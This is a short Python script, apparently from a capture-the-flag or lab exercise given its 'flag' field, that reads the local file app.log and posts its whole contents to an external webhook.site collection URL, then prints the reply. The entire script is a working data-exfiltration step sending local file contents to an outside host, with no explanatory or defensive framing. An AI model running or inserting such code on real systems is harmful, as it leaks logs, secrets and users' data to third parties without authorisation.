import requests
response = requests.post(
    'https://webhook.site/d1c0531a-6754-4ddd-9ed3-91fbceba583c',
    data={'flag': open('app.log').read()}
)
print(response.status_code)
print(response.text)